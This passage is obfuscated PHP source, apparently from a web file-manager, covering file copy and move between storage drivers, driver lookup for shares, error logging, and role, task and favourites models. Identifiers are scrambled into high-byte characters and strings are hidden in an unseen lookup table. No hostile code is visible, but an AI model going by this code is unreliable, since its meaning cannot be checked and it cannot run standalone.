$ù¢–òš = false, $¾À§–ßÎ = true) { $«ˆÚ»¾ä =& $_SERVER[íïàËŸë]; $„Ä’ú™Ø = empty($ù¢–òš) && $ù¢–òš !== $«ˆÚ»¾ä[228] ? $ª—ë™çÇ->pathThis($‚‰•×âÆ) : $ù¢–òš; if ($¶»Š˜•Í) { $â˜¦ËÇ = $ü÷£·->fileNameExist($Ì¿İÃ¸¾, $„Ä’ú™Ø); $ÒŞéÕµÆ = $„Ä’ú™Ø; $„Ä’ú™Ø = $ü÷£·->fileNameAuto($Ì¿İÃ¸¾, $„Ä’ú™Ø, $¶»Š˜•Í, !$Àçàóù²); if (!$â˜¦ËÇ || $ÒŞéÕµÆ != $„Ä’ú™Ø) { $¶»Š˜•Í = !1; } if ($¾À§–ßÎ && !$¶»Š˜•Í) { $ü÷£·->_data[$«ˆÚ»¾ä[1247]] = !0; } } if ($Àçàóù²) { return self::copyFile($ª—ë™çÇ, $‚‰•×âÆ, $ü÷£·, $Ì¿İÃ¸¾, $„Ä’ú™Ø, $óà——¬); } if ($¶»Š˜•Í == REPEAT_RENAME_FOLDER) { $¶»Š˜•Í = !1; } $‘„Õº³» = rtrim($Ì¿İÃ¸¾, $«ˆÚ»¾ä[8]) . $«ˆÚ»¾ä[8] . $„Ä’ú™Ø; $Óø„‰Ë‘ = $ü÷£·->mkdir($ü÷£·->getPath($‘„Õº³»), $¶»Š˜•Í); $Ì¿İÃ¸¾ = $ü÷£·->getPathInner($Óø„‰Ë‘); $÷¢¹ä = $ª—ë™çÇ->listPath($‚‰•×âÆ, !0); $÷¢¹ä = is_array($÷¢¹ä) ? $÷¢¹ä : array($«ˆÚ»¾ä[86] => array(), $«ˆÚ»¾ä[85] => array()); $“÷™Â€ = array_merge($÷¢¹ä[$«ˆÚ»¾ä[86]], $÷¢¹ä[$«ˆÚ»¾ä[85]]); foreach ($“÷™Â€ as $å¹³ë©) { $ù×Êùµ¾ = $å¹³ë©[$«ˆÚ»¾ä[33]] == $«ˆÚ»¾ä[230]; $‚‰•×âÆ = $ª—ë™çÇ->getPathInner($å¹³ë©[$«ˆÚ»¾ä[87]]); $ö‚¹ªò³ = self::copyPath($ª—ë™çÇ, $‚‰•×âÆ, $ü÷£·, $Ì¿İÃ¸¾, $¶»Š˜•Í, $óà——¬, $ù×Êùµ¾, !1, !1); if (!$ö‚¹ªò³) { IO::errorTips($«ˆÚ»¾ä[1248] . $‚‰•×âÆ . $«ˆÚ»¾ä[73] . $Ì¿İÃ¸¾); } } self::copyMoveKeepInfo($ª—ë™çÇ, $‚‰•×âÆ, $Óø„‰Ë‘); return $Óø„‰Ë‘; } private static function copyFile($„ÎÔŠ¥ß, $”ó²ãÌ, $ü”° Ç‚, $ºƒÖèÈ„, $óÁƒ†ê¢, $Š¨³¯ßŸ) { $İ”×Şáí =& $_SERVER[íïàËŸë]; $ºƒÖèÈ„ = $ü”° Ç‚->getPath(rtrim($ºƒÖèÈ„, $İ”×Şáí[8]) . $İ”×Şáí[8] . $óÁƒ†ê¢); $ı®«Àé = $İ”×Şáí[1249] . time() . rand_string(5); Hook::trigger($İ”×Şáí[1250], $„ÎÔŠ¥ß, $”ó²ãÌ, $ü”° Ç‚, $ºƒÖèÈ„, $óÁƒ†ê¢, $ı®«Àé); if (self::driverIsSame($„ÎÔŠ¥ß, $ü”° Ç‚)) { if ($Š¨³¯ßŸ) { $Ê„æèšÏ = $ü”° Ç‚->moveFile($”ó²ãÌ, $ºƒÖèÈ„); } else { $Ê„æèšÏ = $ü”° Ç‚->copyFile($”ó²ãÌ, $ºƒÖèÈ„); } Hook::trigger($İ”×Şáí[1251], $„ÎÔŠ¥ß, $”ó²ãÌ, $ü”° Ç‚, $ºƒÖèÈ„, $óÁƒ†ê¢, $Ê„æèšÏ); self::copyMoveKeepInfo($„ÎÔŠ¥ß, $”ó²ãÌ, $Ê„æèšÏ); return $Ê„æèšÏ; } $Æİ§­Ç» = TEMP_FILES; if ($GLOBALS[$İ”×Şáí[6]][$İ”×Şáí[92]][$İ”×Şáí[879]]) { $Æİ§­Ç» = $GLOBALS[$İ”×Şáí[6]][$İ”×Şáí[92]][$İ”×Şáí[879]]; } $é¢®ĞìÍ = $Æİ§­Ç»; mk_dir($é¢®ĞìÍ); $Ù¤ÙÙš¾ = $é¢®ĞìÍ . $ı®«Àé; $şÅŠâ×ã = $Ù¤ÙÙš¾; $Ù¤ÙÙš¾ = $„ÎÔŠ¥ß->download($”ó²ãÌ, $Ù¤ÙÙš¾); $Ù¤ÙÙš¾ = $„ÎÔŠ¥ß->iconvApp($Ù¤ÙÙš¾); if (substr($Ù¤ÙÙš¾, strlen($Æİ§­Ç»)) == $Æİ§­Ç») { $Š¨³¯ßŸ = !0; } $Ê„æèšÏ = $ü”° Ç‚->upload($ºƒÖèÈ„, $Ù¤ÙÙš¾, $Š¨³¯ßŸ); self::remove($şÅŠâ×ã); Hook::trigger($İ”×Şáí[1251], $„ÎÔŠ¥ß, $”ó²ãÌ, $ü”° Ç‚, $ºƒÖèÈ„, $óÁƒ†ê¢, $Ê„æèšÏ); self::copyMoveKeepInfo($„ÎÔŠ¥ß, $”ó²ãÌ, $Ê„æèšÏ); return $Ê„æèšÏ; } private static function copyMoveKeepInfo($°¨¸ éÌ, $“™ß¢â¹, $ù¹§£ô ) { if (!$ù¹§£ô ) { return; } $¬Àİ’şş = $°¨¸ éÌ->info($“™ß¢â¹); if (!is_array($¬Àİ’şş)) { return; } IO::setModifyTime($ù¹§£ô , $¬Àİ’şş[$_SERVER[íïàËŸë][88]]); } public static function pathFather($âú˜ÅÙË) { $ÆôÁˆÊ¾ = IO::init($âú˜ÅÙË); $å†ş¿Ø” = $ÆôÁˆÊ¾->pathFather($ÆôÁˆÊ¾->path); return $ÆôÁˆÊ¾->getPathOuter($å†ş¿Ø”); } public static function fileOut($‹ãÁ‹—ê, $—õ›ìö = false, $®ÌŞÈ‡× = false, $ô¤õÜüŸ = '') { $õîÜ…Ã÷ = self::driverMake($‹ãÁ‹—ê); if ($õîÜ…Ã÷->isFileOutServer()) { return $õîÜ…Ã÷->fileOutServer($‹ãÁ‹—ê, $—õ›ìö, $®ÌŞÈ‡×, $ô¤õÜüŸ); } return $õîÜ…Ã÷->fileOut($‹ãÁ‹—ê, $—õ›ìö, $®ÌŞÈ‡×, $ô¤õÜüŸ); } public static function fileOutImage($†Ñ¯ƒ‹, $¢¢Ôß÷ğ = 250) { $Ä¥¶Æº = array(250, 600, 1200, 2000, 3000, 5000); for ($‹ªîçÓ¶ = 0; $‹ªîçÓ¶ < count($Ä¥¶Æº); $‹ªîçÓ¶++) { if ($‹ªîçÓ¶ == 0 && $¢¢Ôß÷ğ <= $Ä¥¶Æº[$‹ªîçÓ¶]) { $¢¢Ôß÷ğ = $Ä¥¶Æº[$‹ªîçÓ¶]; break; } else { if ($¢¢Ôß÷ğ > $Ä¥¶Æº[$‹ªîçÓ¶ - 1] && $¢¢Ôß÷ğ <= $Ä¥¶Æº[$‹ªîçÓ¶]) { $¢¢Ôß÷ğ = $Ä¥¶Æº[$‹ªîçÓ¶]; break; } else { if ($‹ªîçÓ¶ == count($Ä¥¶Æº) - 1 && $¢¢Ôß÷ğ > $Ä¥¶Æº[$‹ªîçÓ¶]) { $¢¢Ôß÷ğ = $Ä¥¶Æº[$‹ªîçÓ¶]; break; } } } } $±Ø¥¡ğ = self::driverMake($†Ñ¯ƒ‹); if ($±Ø¥¡ğ->isFileOutServer()) { return $±Ø¥¡ğ->fileOutImageServer($†Ñ¯ƒ‹, $¢¢Ôß÷ğ); } return $±Ø¥¡ğ->fileOutImage($†Ñ¯ƒ‹, $¢¢Ôß÷ğ); } private static function driverIsSame($‘áàç¥İ, $µ•‹˜±) { $äßŞğ¢Ö =& $_SERVER[íïàËŸë]; $ÁÏè® = $‘áàç¥İ->getType(); $¶›ó€œ” = $µ•‹˜±->getType(); if ($ÁÏè® != $¶›ó€œ”) { return !1; } if ($ÁÏè® == $äßŞğ¢Ö[840]) { return !0; } if ($ÁÏè® == $äßŞğ¢Ö[109]) { return !0; } if ($‘áàç¥İ->pathDriver == $µ•‹˜±->pathDriver) { return !0; } return !1; } public static function copyUpdate($ãÅüô®‰, $•Î‚”øÈ) { $ı„ÂÕ”¸ =& $_SERVER[íïàËŸë]; if (!IO::exist($ãÅüô®‰)) { return !1; } if (!IO::exist($•Î‚”øÈ)) { IO::mkdir($•Î‚”øÈ); } $®Ò°ôÍ¤ = array_to_keyvalue(self::listAllSimple($ãÅüô®‰), $ı„ÂÕ”¸[87]); $ÈÒÇÔ¼µ = array_to_keyvalue(self::listAllSimple($•Î‚”øÈ), $ı„ÂÕ”¸[87]); $ïˆÂ«óÇ = array(); $…­Ìï¾½ = array(); foreach ($®Ò°ôÍ¤ as $ËâÇøº‘ => $­­İÜÂÜ) { if (isset($ÈÒÇÔ¼µ[$ËâÇøº‘])) { if ($­­İÜÂÜ[$ı„ÂÕ”¸[78]] == 1) { continue; } if ($ÈÒÇÔ¼µ[$ËâÇøº‘][$ı„ÂÕ”¸[79]] == $­­İÜÂÜ[$ı„ÂÕ”¸[79]]) { continue; } } if ($­­İÜÂÜ[$ı„ÂÕ”¸[78]] == 1) { $…­Ìï¾½[] = $•Î‚”øÈ . $ı„ÂÕ”¸[8] . trim($ËâÇøº‘, $ı„ÂÕ”¸[8]); continue; } $€§ÆØ”À = strstr(trim($ËâÇøº‘, $ı„ÂÕ”¸[8]), $ı„ÂÕ”¸[8]) ? get_path_father($ËâÇøº‘) : $ı„ÂÕ”¸[12]; $ïˆÂ«óÇ[] = array($ı„ÂÕ”¸[1252] => $­­İÜÂÜ[$ı„ÂÕ”¸[89]], $ı„ÂÕ”¸[1253] => rtrim($•Î‚”øÈ, $ı„ÂÕ”¸[8]) . $ı„ÂÕ”¸[8] . $€§ÆØ”À, $ı„ÂÕ”¸[1254] => $­­İÜÂÜ); } $ùÊã”üÏ = array($ı„ÂÕ”¸[230] => $ïˆÂ«óÇ, $ı„ÂÕ”¸[78] => $…­Ìï¾½); Hook::trigger($ı„ÂÕ”¸[1255], $ãÅüô®‰, $•Î‚”øÈ, $ùÊã”üÏ); foreach ($…­Ìï¾½ as $­­İÜÂÜ) { IO::mkdir($­­İÜÂÜ); } foreach ($ïˆÂ«óÇ as $­­İÜÂÜ) { IO::copy($­­İÜÂÜ[$ı„ÂÕ”¸[1252]], $­­İÜÂÜ[$ı„ÂÕ”¸[1253]], REPEAT_REPLACE); } } public static function fileSubstr($‘ïè‰°¯, $¦‚”ÈèĞ, $‘°êâó¬ = false) { $€ ›¸ÂÓ =& $_SERVER[íïàËŸë]; $¼‡òçÓµ = self::driverMake($‘ïè‰°¯); $ÖèªÈœû = $¼‡òçÓµ->size($‘ïè‰°¯); $ı¤˜®¤ª = $¦‚”ÈèĞ; $®ïÕ¦ç = $‘°êâó¬; if ($¦‚”ÈèĞ < 0) { $¦‚”ÈèĞ = $ÖèªÈœû + $¦‚”ÈèĞ; } if ($‘°êâó¬ === !1) { $‘°êâó¬ = $ÖèªÈœû - $¦‚”ÈèĞ; } if ($¦‚”ÈèĞ + $‘°êâó¬ > $ÖèªÈœû) { $‘°êâó¬ = $ÖèªÈœû - $¦‚”ÈèĞ; } if (!$ÖèªÈœû && $¼‡òçÓµ->getType() == $€ ›¸ÂÓ[109] && !$¼‡òçÓµ->exist($‘ïè‰°¯)) { $ÕİÄÄ¤¢ = get_path_this($‘ïè‰°¯); $ÆÉ±¹ŒÃ = parse_url_query($ÕİÄÄ¤¢); if (is_array($ÆÉ±¹ŒÃ) && isset($ÆÉ±¹ŒÃ[$€ ›¸ÂÓ[32]])) { $ÕİÄÄ¤¢ = urldecode($ÆÉ±¹ŒÃ[$€ ›¸ÂÓ[32]]); } throw new Exception($€ ›¸ÂÓ[1256] . LNG($€ ›¸ÂÓ[1257]) . $€ ›¸ÂÓ[1055] . clear_html($ÕİÄÄ¤¢) . $€ ›¸ÂÓ[12]); } if ($‘°êâó¬ <= 0) { return $€ ›¸ÂÓ[12]; } if ($¦‚”ÈèĞ < 0 || $¦‚”ÈèĞ >= $ÖèªÈœû || $‘°êâó¬ > 1024 * 1024 * 10) { throw new Exception("\x66\x69\x6c\145\122\x65\141\144\x20\x65\162\x72\157\162\x21\40\x73\164\141\x72\x74\75{$¦‚”ÈèĞ}\73\x6c\x65\x6e\x67\x74\150\75{$‘°êâó¬}\73\x20\163\x69\x7a\x65\75{$ÖèªÈœû}\x3b"); } $ŞŞ¡ïÌ = $¼‡òçÓµ->fileSubstr($‘ïè‰°¯, $¦‚”ÈèĞ, $‘°êâó¬); if (!$ŞŞ¡ïÌ && $‘°êâó¬ && isset($GLOBALS[$€ ›¸ÂÓ[1258]])) { throw new Exception($GLOBALS[$€ ›¸ÂÓ[1258]][$€ ›¸ÂÓ[1259]]); } return $ŞŞ¡ïÌ; } private static function driverMake(&$í¾ù•ÍŒ) { $Ì‘¦Œ•å =& $_SERVER[íïàËŸë]; $‹€»‘ƒĞ = KodIO::parse($í¾ù•ÍŒ); if (!self::$driverListSystem) { $âòÑÄñÒ = Model($Ì‘¦Œ•å[850])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($âòÑÄñÒ, $Ì‘¦Œ•å[475]); } if ($‹€»‘ƒĞ[$Ì‘¦Œ•å[33]] == KodIO::KOD_IO && !self::$driverListSystem[$‹€»‘ƒĞ[$Ì‘¦Œ•å[475]]]) { throw new Exception($Ì‘¦Œ•å[1260]); return !1; } $í¾ù•ÍŒ = $‹€»‘ƒĞ[$Ì‘¦Œ•å[1261]]; $ûäĞËñã = self::driverGet($‹€»‘ƒĞ, $í¾ù•ÍŒ); return $ûäĞËñã; } private static function driverGet($şÁêÅÓÉ, &$ÅÏš³ÊÚ) { $‰¨â¬û =& $_SERVER[íïàËŸë]; $áæ¢È” = $şÁêÅÓÉ[$‰¨â¬û[1262]]; $¼ˆ€ªŒ‘ = $şÁêÅÓÉ[$‰¨â¬û[475]]; switch ($şÁêÅÓÉ[$‰¨â¬û[33]]) { case KodIO::KOD_IO: $„»Ğ»ì = self::$driverListSystem[$¼ˆ€ªŒ‘]; break; case KodIO::KOD_SOURCE: $ÅÏš³ÊÚ = $¼ˆ€ªŒ‘ . $ÅÏš³ÊÚ; $„»Ğ»ì = array($‰¨â¬û[1263] => $‰¨â¬û[1264], $‰¨â¬û[6] => $şÁêÅÓÉ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $›²—Ãé• = $GLOBALS[$‰¨â¬û[1265]]; self::$driverListUser = array_to_keyvalue($›²—Ãé•, $‰¨â¬û[475]); } $„»Ğ»ì = self::$driverListUser[$¼ˆ€ªŒ‘]; break; case KodIO::KOD_SHARE_LINK: $„»Ğ»ì = array($‰¨â¬û[1263] => $‰¨â¬û[1266], $‰¨â¬û[6] => $şÁêÅÓÉ); $–åÜñ = Action($‰¨â¬û[1267])->sharePathInfo($şÁêÅÓÉ[$‰¨â¬û[87]]); $ÅÏš³ÊÚ = $–åÜñ[$‰¨â¬û[193]]; if (!$–åÜñ[$‰¨â¬û[193]]) { $Ê«ÜÑú = Model($‰¨â¬û[664])->getInfo($–åÜñ[$‰¨â¬û[665]]); $ÅÏš³ÊÚ = KodIO::clear($Ê«ÜÑú[$‰¨â¬û[1268]] . $şÁêÅÓÉ[$‰¨â¬û[1261]]); $şÁêÅÓÉ[$‰¨â¬û[560]] = $Ê«ÜÑú; $şÁêÅÓÉ[$‰¨â¬û[1243]] = $ÅÏš³ÊÚ; $„»Ğ»ì = array($‰¨â¬û[1263] => $‰¨â¬û[1269], $‰¨â¬û[6] => $şÁêÅÓÉ); } break; case KodIO::KOD_SHARE_ITEM: $„»Ğ»ì = array($‰¨â¬û[1263] => $‰¨â¬û[1270], $‰¨â¬û[6] => $şÁêÅÓÉ); $Ê«ÜÑú = Model($‰¨â¬û[664])->getInfo($şÁêÅÓÉ[$‰¨â¬û[475]]); if ($Ê«ÜÑú[$‰¨â¬û[193]] == $‰¨â¬û[228]) { $ÅÏš³ÊÚ = KodIO::clear($Ê«ÜÑú[$‰¨â¬û[1268]] . $şÁêÅÓÉ[$‰¨â¬û[1261]]); $şÁêÅÓÉ[$‰¨â¬û[560]] = $Ê«ÜÑú; $şÁêÅÓÉ[$‰¨â¬û[1243]] = $ÅÏš³ÊÚ; $„»Ğ»ì = array($‰¨â¬û[1263] => $‰¨â¬û[1271], $‰¨â¬û[6] => $şÁêÅÓÉ); } else { if (!$ÅÏš³ÊÚ) { $ÅÏš³ÊÚ = $Ê«ÜÑú[$‰¨â¬û[193]]; } } break; default: $ÅÏš³ÊÚ = $şÁêÅÓÉ[$‰¨â¬û[87]]; $„»Ğ»ì = array($‰¨â¬û[1263] => $‰¨â¬û[1272]); break; } $Ù¼´¬¨· = $şÁêÅÓÉ[$‰¨â¬û[87]]; if (!isset(self::$driverCache[$Ù¼´¬¨·])) { $£¬ºùÖ© = strtolower($„»Ğ»ì[$‰¨â¬û[98]]); $šğöèº® = $GLOBALS[$‰¨â¬û[6]][$‰¨â¬û[92]][$‰¨â¬û[908]]; $Ôé†€œ‡ = $‰¨â¬û[77] . (isset($šğöèº®[$£¬ºùÖ©]) ? $šğöèº®[$£¬ºùÖ©] : ucfirst($£¬ºùÖ©)); if (!class_exists($Ôé†€œ‡)) { show_json("{$Ôé†€œ‡}\40\x6e\x6f\164\x20\x65\170\151\x73\164\163\41", !1); } $îÚÈ‹¾– = isset($„»Ğ»ì[$‰¨â¬û[6]]) ? $„»Ğ»ì[$‰¨â¬û[6]] : !1; self::$driverCache[$Ù¼´¬¨·] = new $Ôé†€œ‡($îÚÈ‹¾–); } $ÌäÎ´¦¬ = self::$driverCache[$Ù¼´¬¨·]; $ÌäÎ´¦¬->pathDriver = $áæ¢È”; $ÌäÎ´¦¬->pathBase = $‰¨â¬û[12]; if (isset($„»Ğ»ì[$‰¨â¬û[6]][$‰¨â¬û[1273]])) { $ÌäÎ´¦¬->pathBase = rtrim($„»Ğ»ì[$‰¨â¬û[6]][$‰¨â¬û[1273]], $‰¨â¬û[8]) . $‰¨â¬û[8]; $ÅÏš³ÊÚ = $ÌäÎ´¦¬->pathBase . ltrim($ÅÏš³ÊÚ, $‰¨â¬û[8]); } $ÅÏš³ÊÚ = $ÌäÎ´¦¬->getPath($ÅÏš³ÊÚ); if (isset($şÁêÅÓÉ[$‰¨â¬û[1243]])) { $ÅÏš³ÊÚ = $şÁêÅÓÉ[$‰¨â¬û[1243]]; } $ÌäÎ´¦¬->path = $ÅÏš³ÊÚ; return $ÌäÎ´¦¬; } public static function errorTips($Ö¿¯ ‘ = false) { $ÆŒï–Ûè =& $_SERVER[íïàËŸë]; static $€’ÆôßÇ = array(); $´‹° = 1000; if ($Ö¿¯ ‘ === -1) { return $€’ÆôßÇ ? $€’ÆôßÇ[count($€’ÆôßÇ) - 1] : $ÆŒï–Ûè[12]; } if ($Ö¿¯ ‘ === !1) { return implode($ÆŒï–Ûè[262], $€’ÆôßÇ); } if (count($€’ÆôßÇ) >= $´‹°) { $€’ÆôßÇ = array_slice($€’ÆôßÇ, $´‹° * 0.5, $´‹°); } $€’ÆôßÇ[] = $Ö¿¯ ‘; write_log($ÆŒï–Ûè[176] . ACTION . $ÆŒï–Ûè[1274] . $Ö¿¯ ‘, $ÆŒï–Ûè[1275]); } public static function getLastError($Ï§®‘ = '') { $ãá½”ó† = self::errorTips(-1); return $ãá½”ó† ? $ãá½”ó† : $Ï§®‘; } } goto aÅ²Å•ÓİÂ; c °…Ş§ŒÛ: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\x2e\162\157\x6c\145\114\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\141\x75\x74\150", "\154\x61\x62\x65\154", "\x64\x69\163\x70\x6c\x61\171", "\x73\171\163\x74\145\x6d", "\x64\145\x73\x63", "\x69\x67\156\157\x72\x65\x45\x78\164", "\151\x67\x6e\157\x72\145\106\151\154\145\123\x69\x7a\145", "\x61\x64\x6d\x69\156\151\x73\164\x72\x61\164\x6f\x72", "\x73\157\162\x74"); public function listData($ÚÒœüÜ´ = false, $„¯Äô„ = "\x73\x6f\162\164", $ÀÍ£Ğø = false) { $ØÉ’í†¹ =& $_SERVER[íïàËŸë]; $³À‡½Ö = parent::listData($ÚÒœüÜ´, $„¯Äô„, $ÀÍ£Ğø); if (!$ÚÒœüÜ´) { foreach ($³À‡½Ö as $Šœ²¯–× => $Ì¢İ³³²) { if ($Ì¢İ³³²[$ØÉ’í†¹[2187]] == 1) { $³À‡½Ö[$Šœ²¯–×][$ØÉ’í†¹[526]] = LNG($ØÉ’í†¹[2448]); } } } return $³À‡½Ö; } public function update($¸ö­çî, $úÌÀì”ş) { $ñùÊ¿àÇ =& $_SERVER[íïàËŸë]; $íü¥Ëö¼ = parent::listData($¸ö­çî); $Œòİ‡Î‡ = $this->findByName($úÌÀì”ş[$ñùÊ¿àÇ[32]]); if (!$íü¥Ëö¼ || $Œòİ‡Î‡ && $Œòİ‡Î‡[$ñùÊ¿àÇ[475]] != $íü¥Ëö¼[$ñùÊ¿àÇ[475]]) { return !1; } if ($Œòİ‡Î‡[$ñùÊ¿àÇ[2187]] == 1) { $úÌÀì”ş = array($ñùÊ¿àÇ[32] => $úÌÀì”ş[$ñùÊ¿àÇ[32]], $ñùÊ¿àÇ[2003] => $úÌÀì”ş[$ñùÊ¿àÇ[2003]]); } $this->filterAuth($úÌÀì”ş[$ñùÊ¿àÇ[487]]); return parent::update($¸ö­çî, $úÌÀì”ş); } public function remove($ùŠ·›½ß) { $±£ĞŠİ = parent::listData($ùŠ·›½ß); if (!$±£ĞŠİ || $±£ĞŠİ[$_SERVER[íïàËŸë][191]]) { return !1; } return parent::remove($ùŠ·›½ß); } public function add($¾ĞßöıÏ) { $›­‹ü¼â =& $_SERVER[íïàËŸë]; $ôÀÉ½¡ì = $¾ĞßöıÏ[$›­‹ü¼â[32]]; if ($this->findByName($ôÀÉ½¡ì)) { return !1; } $Ì„ôã‘ = array($›­‹ü¼â[494] => $ôÀÉ½¡ì, $›­‹ü¼â[1986] => $›­‹ü¼â[12], $›­‹ü¼â[1982] => $›­‹ü¼â[1990], $›­‹ü¼â[2449] => 1, $›­‹ü¼â[1985] => 0, $›­‹ü¼â[2450] => 0, $›­‹ü¼â[1984] => $this->getSort()); $¾ĞßöıÏ = array_merge($Ì„ôã‘, $¾ĞßöıÏ); $this->filterAuth($¾ĞßöıÏ[$›­‹ü¼â[487]]); return parent::insert($¾ĞßöıÏ); } private function getSort() { $…ÇéÏìì =& $_SERVER[íïàËŸë]; $å’õòÁ = parent::listData(); $ï­ÇÜ‚ = array_to_keyvalue($å’õòÁ, $…ÇéÏìì[12], $…ÇéÏìì[2004]); return empty($ï­ÇÜ‚) ? 0 : max($ï­ÇÜ‚) + 1; } private function filterAuth(&$ğÑ•™İã) { $·’ÆıÔâ =& $_SERVER[íïàËŸë]; $¬¤ëä™ = array(); $¥¦ñØñó = array_filter(explode($·’ÆıÔâ[50], $ğÑ•™İã)); foreach ($¥¦ñØñó as $ğÑ•™İã) { $†ÍÕßœ  = explode($·’ÆıÔâ[10], $ğÑ•™İã); if ($†ÍÕßœ [0] == $·’ÆıÔâ[2451] && $†ÍÕßœ [1] != $·’ÆıÔâ[1286]) { $ë­¾Ğ•Ú = $†ÍÕßœ [0] . $·’ÆıÔâ[10] . $†ÍÕßœ [1] . $·’ÆıÔâ[2452]; if (!in_array($ë­¾Ğ•Ú, $¥¦ñØñó)) { $¬¤ëä™[] = $ë­¾Ğ•Ú; } } $¬¤ëä™[] = $ğÑ•™İã; } $ğÑ•™İã = implode($·’ÆıÔâ[50], $¬¤ëä™); } public function findRoleDefault() { $ùˆ«øè =& $_SERVER[íïàËŸë]; $µŒ¿ã‰  = parent::listData(); $ûŒÍïò = !1; foreach ($µŒ¿ã‰  as $£’Ù¹Â‰) { if (!$£’Ù¹Â‰ || $£’Ù¹Â‰[$ùˆ«øè[2002]] == $ùˆ«øè[228] || $£’Ù¹Â‰[$ùˆ«øè[2187]] == 1) { continue; } if (strstr($£’Ù¹Â‰[$ùˆ«øè[487]], $ùˆ«øè[2453])) { continue; } if (!strstr($£’Ù¹Â‰[$ùˆ«øè[487]], $ùˆ«øè[2454])) { continue; } if (!$ûŒÍïò) { $ûŒÍïò = $£’Ù¹Â‰; continue; } $³ú‚óéÑ = explode($ùˆ«øè[50], $ûŒÍïò[$ùˆ«øè[487]]); $§ò›‚û¦ = explode($ùˆ«øè[50], $£’Ù¹Â‰[$ùˆ«øè[487]]); if (count($³ú‚óéÑ) > count($§ò›‚û¦)) { $ûŒÍïò = $£’Ù¹Â‰; } } return $ûŒÍïò ? $ûŒÍïò[$ùˆ«øè[475]] : $ùˆ«øè[12]; } public function sort($öÇĞËÆ¡, $‹²¤Õ‰İ) { return parent::update($öÇĞËÆ¡, $‹²¤Õ‰İ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\56\164\141\x73\x6b\114\x69\x73\x74"; public $field = array("\156\141\155\145", "\164\171\160\x65", "\x65\x76\145\156\x74", "\x74\151\x6d\x65", "\144\145\x73\x63", "\163\x79\163\x74\x65\x6d", "\145\x6e\141\x62\x6c\145", "\x6c\141\163\164\x52\165\156", "\x73\x6f\x72\x74"); public function listData($Ã–¥ƒ = false, $ÆÃµÙº­ = "\x73\157\162\164", $ïÃ¦ÌáÙ = false) { return parent::listData($Ã–¥ƒ, $ÆÃµÙº­, $ïÃ¦ÌáÙ); } public function add($ îÍÓ­) { $¡õÆ‚ =& $_SERVER[íïàËŸë]; $™‚àÔÆÔ = $this->findByName($ îÍÓ­[$¡õÆ‚[32]]); if ($™‚àÔÆÔ) { return !1; } $ îÍÓ­[$¡õÆ‚[1733]] = 0; $ îÍÓ­[$¡õÆ‚[2004]] = $this->getSort(); return parent::insert($ îÍÓ­); } private function getSort() { $Ÿğ°ÇÀ± =& $_SERVER[íïàËŸë]; $ŸŒ•”Ä  = parent::listData(); $¤¤¦¬ˆ¦ = array_to_keyvalue($ŸŒ•”Ä , $Ÿğ°ÇÀ±[12], $Ÿğ°ÇÀ±[2004]); return empty($¤¤¦¬ˆ¦) ? 0 : max($¤¤¦¬ˆ¦) + 1; } public function update($ªëüƒóê, $ò£İÏš) { $ŒÅê—Óâ =& $_SERVER[íïàËŸë]; $€Ì©ÙÛ  = $this->listData($ªëüƒóê); $ÔÉÔŞÊÎ = $this->findByName($ò£İÏš[$ŒÅê—Óâ[32]]); if (!$€Ì©ÙÛ  || $ÔÉÔŞÊÎ && $ÔÉÔŞÊÎ[$ŒÅê—Óâ[475]] != $€Ì©ÙÛ [$ŒÅê—Óâ[475]]) { return !1; } return parent::update($ªëüƒóê, $ò£İÏš); } public function remove($ÄÇí„Î¦, $­ÄÜ‡‘ = false) { $–¥ÌÁÁï =& $_SERVER[íïàËŸë]; $…ÎƒÖ®– = $this->listData($ÄÇí„Î¦); if (!$…ÎƒÖ®–) { return; } if (!$­ÄÜ‡‘ && $…ÎƒÖ®–[$–¥ÌÁÁï[191]] == $–¥ÌÁÁï[91]) { return !1; } return parent::remove($ÄÇí„Î¦); } public function enable($òÅÔÂ¸», $å½ùˆïå) { return $this->update($òÅÔÂ¸», array($_SERVER[íïàËŸë][2443] => $å½ùˆïå)); } public function run($– ÚÍ¶Æ) { return $this->update($– ÚÍ¶Æ, array($_SERVER[íïàËŸë][2455] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($É‡à‰€¶) { $Õù÷ãÕŠ =& $_SERVER[íïàËŸë]; return array($Õù÷ãÕŠ[2095] => array(USER_ID, $Õù÷ãÕŠ[2456])); } protected function listData() { $øğ­ÔëÏ =& $_SERVER[íïàËŸë]; $©¬…ªÎ = array($øğ­ÔëÏ[1773] => USER_ID, $øğ­ÔëÏ[557] => 0); $–óÒåÎ… = $øğ­ÔëÏ[2457]; $üã¾íñÀ = $this->field($–óÒåÎ…)->where($©¬…ªÎ)->order($øğ­ÔëÏ[2458])->select(); return $üã¾íñÀ ? $üã¾íñÀ : array(); } protected function resetCache() { } protected function listView() { $™Ğñ¡© =& $_SERVER[íïàËŸë]; $åµ¹™ÇŠ = $this->listData(); $€—ìïƒÂ = array_filter_by_field($åµ¹™ÇŠ, $™Ğñ¡©[33], $™Ğñ¡©[490]); $›‘¬Şì = array_to_keyvalue($€—ìïƒÂ, $™Ğñ¡©[12], $™Ğñ¡©[87]); if (!$›‘¬Şì) { return $åµ¹™ÇŠ; } $Ùş¼¹ê– = 2000; $Ğšæõ–» = array($™Ğñ¡©[491] => array($™Ğñ¡©[492], $›‘¬Şì)); $¥»ß‚’ = Model($™Ğñ¡©[907])->listSource($Ğšæõ–», $Ùş¼¹ê–); $¥»ß‚’ = array_merge($¥»ß‚’[$™Ğñ¡©[86]], $¥»ß‚’[$™Ğñ¡©[85]]); $¥»ß‚’ = array_to_keyvalue($¥»ß‚’, $™Ğñ¡©[193]); foreach ($åµ¹™ÇŠ as $•‡›Íà => $¾Ûš‡Æ£) { $¶’‹°Ô = $¥»ß‚’[$¾Ûš‡Æ£[$™Ğñ¡©[87]]]; $¶’‹°Ô = $¶’‹°Ô ? $¶’‹°Ô : array(); $åµ¹™ÇŠ[$•‡›Íà] = array_merge($¶’‹°Ô, $¾Ûš‡Æ£); } return $åµ¹™ÇŠ; } protected function addFav($ŞÈÊæºÎ, $–»ÎÏß¼ = '', $àûêÁÍò = "\x73\157\x75\162\x63\145") { $Û¢ïåâ =& $_SERVER[íïàËŸë]; $Ÿİ£²¯ü = array($Û¢ïåâ[1773] => 